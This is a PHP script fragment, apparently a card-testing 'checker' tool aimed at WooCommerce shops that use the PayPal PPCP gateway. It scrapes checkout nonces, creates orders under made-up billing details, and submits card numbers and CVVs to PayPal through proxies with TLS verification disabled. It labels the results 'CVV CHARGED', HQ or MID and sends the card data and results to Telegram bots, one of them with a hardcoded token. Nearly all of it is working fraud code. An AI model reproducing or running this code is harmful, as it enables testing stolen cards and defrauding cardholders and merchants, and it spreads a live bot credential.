$createOrderNonce = '';
$approveOrderNonce = '';
if (preg_match('/"create_order":\{"endpoint":".*?","nonce":"([^"]+)"/', $Checkout, $matches)) {
    $createOrderNonce = $matches[1];
}
if (preg_match('/"approve_order":\{"endpoint":".*?","nonce":"([^"]+)"/', $Checkout, $matches)) {
    $approveOrderNonce = $matches[1];
}
$clientnonce = preg_match('/"data_client_id":\s*{\s*"set_attribute":.*?\s*"endpoint":.*?\s*"nonce":\s*"([^"]+)"/', $Checkout, $matches) ? $matches[1] : null;
$nonce = trim(strip_tags(getStr($Checkout,'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$patterns = '/<tr class="order-total">.*?<th>Total<\/th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)<\/span>\s*([\d.]+)/s';
if (preg_match($patterns, $Checkout, $matches)) {
    $currency_symbol = $matches[1];
    $amount = $matches[2];
    if ($currency_symbol == '&pound;') {
        $currency_symbol = '£';
    }
}    
  $price1 = $currency_symbol . $amount;
  
  $quality = !empty($price1) ? "HQ" : "MID";
  
  $hostname = $domain;
  
  
# --------------- [ retries ] ----------- #

$retries = 0;

goers:

# ------------------ [ CLIENT ID ] ------------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=ppc-data-client-id");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://'.$hostname,
    'referer: https://www.'.$hostname.'/checkout/',
    'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: '.$ua,
    'x-requested-with: XMLHttpRequest',
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookieJar, CURLOPT_COOKIEJAR => $cookieJar]);
$data = [
    'set_attribute' => true,
    'nonce' => $clientnonce,
    'user' => '0',
    'has_subscriptions' => false,
    'paypal_subscriptions_enabled' => false
];

$postFields = json_encode($data, JSON_PRETTY_PRINT);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);

$ClientId = curl_exec($ch);
curl_close($ch);

$responseData = json_decode($ClientId, true);

$token = $responseData['token'] ?? null;
if ($token) {
    // Decode base64
    $b64 = base64_decode($token, true);
    if ($b64 === false) {

    } else {
        
        $dat = json_decode($b64, true);
        
        if (json_last_error() !== JSON_ERROR_NONE) {
            
        } else {
            
            $accessToken = $dat['paypal']['accessToken'] ?? null;
            
            if ($accessToken);
        }
    }
}
# ------------------ [ CREATE ORDER ] ------------- #
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=ppc-create-order");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookieJar, CURLOPT_COOKIEJAR => $cookieJar]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'nonce' => $createOrderNonce,
    'payer' => null,
    'bn_code' => 'Woo_PPCP',
    'context' => 'checkout',
    'order_id' => '0',
    'payment_method' => 'ppcp-gateway',
    'form_encoded' => http_build_query([
        'billing_first_name' => $fname,
        'billing_last_name' => $lname,
        'billing_company' => '',
        'billing_country' => $country,
        'billing_address_1' => $street,
        'billing_address_2' => '',
        'billing_city' => $city,
        'billing_state' => $state,
        'billing_postcode' => $zip,
        'billing_phone' => $phone,
        'billing_email' => $email,
        'message_' => '1',
        'account_username' => $fname.''.$numNames,
        'account_password' => $numNames.''.$fname,
        'order_comments' => '',
        'additional_Recycle_Excess_Packaging_For_me' => 'yes',
        'authority_to_leave' => 'No',
        'payment_method' => 'ppcp-gateway',
        'terms' => 'on',
        'terms-field' => '1',
        'grecaptcha_required' => 'true',
        'woocommerce-process-checkout-nonce' => $nonce,
        '_wp_http_referer' => '%2F%3Fwc-ajax%3Dupdate_order_review'
    ]),
    'createaccount' => false,
    'save_payment_method' => false
]));

$createorder = curl_exec($ch);
curl_close($ch);
$data = json_decode($createorder, true);

if ($data['success']) {
    $order_id = $data['data']['id'];
    $custom_id = $data['data']['custom_id'];
}

# ---------------- [ CONFIRM PAYMENT ] ------------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://cors.api.paypal.com/v2/checkout/orders/$order_id/confirm-payment-source");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'Authorization: Bearer '.$accessToken,
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookieJar, CURLOPT_COOKIEJAR => $cookieJar]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'payment_source' => [
        'card' => [
            'number' => $cc,
            'security_code' => $cvv,
            'expiry' => $ano . '-' . $mes
        ]
    ]
]));

$confirm = curl_exec($ch);
curl_close($ch);
# ----------------- [ APPROVE ORDER ] ------------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=ppc-approve-order");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookieJar, CURLOPT_COOKIEJAR => $cookieJar]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'nonce' => $approveOrderNonce,
    'order_id' => $order_id
]));


$approve = curl_exec($ch);
curl_close($ch);


$telegramToken = "8476084699:AAHtrHqe3V3GSxrxdNmhg_qg1BKMf5V51rE"; // Replace with your bot token
$chatId = "-1003062666826"; // Replace with your chat ID
# ---------------- [ WC AJAX ] --------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=checkout");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
    'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookieJar, CURLOPT_COOKIEJAR => $cookieJar]);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'billing_first_name' => $fname,
    'billing_last_name' => $lname,
    'billing_company' => '',
    'billing_country' => $country,
    'billing_address_1' => $street,
    'billing_address_2' => '',
    'billing_city' => $city,
    'billing_state' => $state,
    'billing_postcode' => $zip,
    'billing_phone' => $phone,
    'billing_email' => $email,
    'message_' => '1',
    'account_username' => $fname.''.$numNames,
    'account_password' => $numNames.''.$fname,
    'order_comments' => '',
    'payment_method' => 'ppcp-gateway',
    'terms' => 'on',
    'terms-field' => '1',
    'grecaptcha_required' => 'true',
    'woocommerce-process-checkout-nonce' => $nonce,
    '_wp_http_referer' => '%2F%3Fwc-ajax%3Dupdate_order_review',
    'ppcp-resume-order' => $custom_id
]));

$Payment = curl_exec($ch);
curl_close($ch);

$telegram = $_GET['forwarder'];
$parts = explode(":", $telegram);
$telegramToken1 = $parts[0] . ":" . $parts[1];
$chatId1 = $parts[2];


// Function to send message to Telegram
function sendToTelegram($message, $telegramToken, $chatId) {
    $url = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    @file_get_contents($url);
}

// Function to send a message to multiple bots
function forwardToBots($message, $bots) {
    foreach ($bots as $bot) {
        sendToTelegram($message, $bot['token'], $bot['chatId']);
    }
}

if (empty($Payment)) {
     "Payment data is empty!";
} else {
    $PaymentDecoded = html_entity_decode($Payment, ENT_QUOTES, 'UTF-8');
    $PaymentDecoded = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $PaymentDecoded);
    $decodedPayment = json_decode($PaymentDecoded, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        if (isset($decodedPayment['messages'])) {
            $Respo = strip_tags($decodedPayment['messages']);
            $Respo = preg_replace('/\s+/', ' ', $Respo);
            $Respo = trim($Respo);
            $Respo = htmlentities($Respo, ENT_QUOTES, 'UTF-8');
             "Message: " . $Respo . "<br>";
        } else {
             "The 'messages' field is missing in the payment data.<br>";
        }
        if (isset($decodedPayment['redirect'])) {
            $receipt = $decodedPayment['redirect'];
            $receipt = htmlentities($receipt, ENT_QUOTES, 'UTF-8');
             "Redirect URL: " . $receipt;
        } else {
             "The 'redirect' field is missing in the payment data.";
        }
    } else {
         "Error decoding JSON: " . json_last_error_msg();
    }
}
$linky = trim(strip_tags(getstr($Payment, '"redirect":"','",')));
$orderid = trim(strip_tags(getstr($Payment, '"order_id":','}')));
$decodedResponse = json_decode($Payment, true);

if (isset($decodedResponse['redirect'])) {
    $receipt = $decodedResponse['redirect'];
}
 $receiptUrl = urldecode($receipt);







$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bincheck.io/details/' . $cc6);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);

// Optional headers (can be omitted if the site doesn't require them)
$headers = [
    'user-agent: '.$ua,
    'referer: https://bincheck.io/',
    'accept-language: en-US,en;q=0.9'
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
curl_close($ch);
// --- function declared at top of your script ---
// --- later, after curl_exec and curl_close ---

if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    
         echo '<span style="color: #ffffffff; padding: 8px;"> #HQ [CVV CHARGED][AMOUNT:'.$price1.'] ['.$ip.'] </a> <a href="' . $receiptUrl . '" target="_blank">RECEIPT</a> <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

    // Prepare Telegram message for CVV (Captcha Detected)
    $telegramMessage = "[#CHARGED] - $lista [PPCP-GATEWAY CVV CHARGED] 
    \n[$receiptUrl]
    \n[$price1]
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

$log_entry = "*GATEWAY : PPCP CREDIT CARD*\n";
$log_entry .= "*CVV* : `" . $escaped_lista . "`\n";
$log_entry .= "*Hostname* : `" . $escaped_hostname . "`\n";
$log_entry .= "*Name* : `" . $escaped_fname . "`\n";
$log_entry .= "*Lastname* : `" . $escaped_lname . "`\n";
$log_entry .= "*Street* : `" . $escaped_street . "`\n";
$log_entry .= "*City* : `" . $escaped_city . "`\n";
$log_entry .= "*State* : `" . $escaped_state . "`\n";
$log_entry .= "*Zip* : `" . $escaped_zip . "`\n";
$log_entry .= "*Country* : `" . $escaped_country . "`\n";
$log_entry .= "*Phone* : `" . $escaped_phone . "`\n";
$log_entry .= "*Email* : `" . $escaped_email . "`\n";


} elseif (strpos($Payment, "We were unable to process your order, please try again.") !== false) {
   
   echo '   #MID
        <br>RESPO ℹ️:[NONCE ERROR]
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';

} elseif (strpos($Payment, '{"result":"failure","messages":"","refresh":false,"reload":true}') !== false) {
    
    echo '   #MID
        <br>RESPO ℹ️:[DECLINED]
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';

} elseif (strpos($Respo, 'Sorry, your session has expired. Return to shop') !== false) {
   
    echo '   #MID
        <br>RESPO ℹ️:[Sorry, your session has expired.]
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';

} elseif (strpos($Respo, 'Failed to process the payment. Please try again or contact the shop admin. [UNPROCESSABLE_ENTITY] The requested action could not be performed, semantically incorrect, or failed business validation. https://developer.paypal.com/api/rest/reference/orders/v2/errors/#PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING') !== false) {
   
    echo '   #MID
        <br>RESPO ℹ️:[PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING]
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';
       $telegramMessage = "[MID] $ppage
    \n[PRICE: $price1]
    \n[$paymentList] [CF:$cloudflareStatus]
    \n[RESPO: PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING]\n";
    sendToTelegram($telegramMessage, $telegramToken1, $chatId1);

} elseif (strpos($Respo, 'Failed to process the payment. Please try again or contact the shop admin. [UNPROCESSABLE_ENTITY] The requested action could not be performed, semantically incorrect, or failed business validation. https://developer.paypal.com/api/rest/reference/orders/v2/errors/#ORDER_NOT_APPROVED') !== false) {
   
    echo '   #MID
        <br>RESPO ℹ️:[ORDER_NOT_APPROVED]
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';
    $telegramMessage = "[MID] $ppage
    \n[PRICE: $price1]
    \n[$paymentList] [CF:$cloudflareStatus]
    \n[RESPO: ORDER_NOT_APPROVED]\n";
    sendToTelegram($telegramMessage, $telegramToken1, $chatId1);
    
} elseif (strpos($Respo, 'Payment provider declined the payment, please use a different payment method.') !== false) {
    
    echo "   #$quality
        <br>RESPO ℹ️:[Payment provider declined the payment]
        <br>PRODUCT PAGE :[$ppage]
        <br>PAYMENT METHOD 💵:[$paymentList]
        <br>COUNTRY 🌎:" . getGeolocation($domain) . "
        <br>CAPTCHA 🔄:$captchaStatus
        <br>CLOUDFLARE ☁️: $cloudflareStatus
        <br>PRICE 💰: $price1
        <br>TIME 🕒: {$executionTime}s<br><br>";
     /////Prepare Telegram message for CHARGED (No CAPTCHA)
        $telegramMessage = "[HQ] - $lista 
            \n[Payment provider declined the payment]
            \n[$paymentList]
            \n[$price1]
            \n[$executionTime]";

        $bots = [
                ['token' => $telegramToken1,  'chatId' => $chatId1],
                ['token' => $telegramToken,  'chatId' => $chatId]];
    forwardToBots($telegramMessage, $bots);
    
} elseif (strpos($Respo, 'Failed to process the payment. Please try again or contact the shop admin. [UNPROCESSABLE_ENTITY] PayPal rejected the payment. Please reach out to the PayPal support for more information. https://developer.paypal.com/api/rest/reference/orders/v2/errors/#PAYMENT_DENIED') !== false) {
   
    echo '   #HQ
        <br>RESPO ℹ️:[PAYMENT_DENIED]
        <br>PRODUCT PAGE :['.$ppage.']
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>PRICE 💰: '.$price1.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';
        
        $telegramMessage = "[HQ] $ppage
    \n[PRICE: $price1]
    \n[$paymentList] [CF:$cloudflareStatus]
    \n[RESPO: PAYMENT_DENIED]\n";
    sendToTelegram($telegramMessage, $telegramToken1, $chatId1);

} elseif (strpos($Respo, 'Failed to process the payment. Please try again or contact the shop admin. [UNPROCESSABLE_ENTITY] The transaction has been refused because the Invoice ID already exists. Please create a new order or reach out to the store owner. https://developer.paypal.com/api/rest/reference/orders/v2/errors/#DUPLICATE_INVOICE_ID') !== false) {
   
   echo '   #HQ
        <br>RESPO ℹ️:[DUPLICATE_INVOICE_ID]
        <br>PRODUCT PAGE :['.$ppage.']
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>PRICE 💰: '.$price1.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';

        $telegramMessage = "[MID] $ppage
    \n[PRICE: $price1]
    \n[$paymentList] [CF:$cloudflareStatus]
    \n[RESPO: DUPLICATE_INVOICE_ID]\n";
    sendToTelegram($telegramMessage, $telegramToken1, $chatId1);

} elseif (strpos($Respo, 'Failed to process the payment. Please try again or contact the shop admin. [UNPROCESSABLE_ENTITY] The transaction has been refused by the payment processor. Please reach out to the PayPal support for more information. https://developer.paypal.com/api/rest/reference/orders/v2/errors/#TRANSACTION_REFUSED') !== false) {
   
    echo '   #HQ
        <br>RESPO ℹ️:[TRANSACTION_REFUSED]
        <br>PRODUCT PAGE :['.$ppage.']
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>PRICE 💰: '.$price1.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';
        
        $telegramMessage = "[MID] $ppage
    \n[PRICE: $price1]
    \n[$paymentList] [CF:$cloudflareStatus]
    \n[RESPO: TRANSACTION_REFUSED]\n";
    sendToTelegram($telegramMessage, $telegramToken1, $chatId1);

} else {
    echo '   #MID
        <br>RESPO ℹ️:['.$Respo.']
        <br>PAYMENT METHOD 💵:['.$paymentList.']
        <br>COUNTRY 🌎:'.getGeolocation($domain).'
        <br>CAPTCHA 🔄:'.$captchaStatus.'
        <br>CLOUDFLARE ☁️: '.$cloudflareStatus.'
        <br>TIME 🕒: '.$executionTime.'s<br><br>';

         $telegramMessage = "[MID] $ppage
    \n[PRICE: $price1]
    \n[$paymentList] [CF:$cloudflareStatus]
    \n[RESPO: $Respo]\n";
    sendToTelegram($telegramMessage, $telegramToken1, $chatId1);
    
}
    

unlink($cookieJar);

?>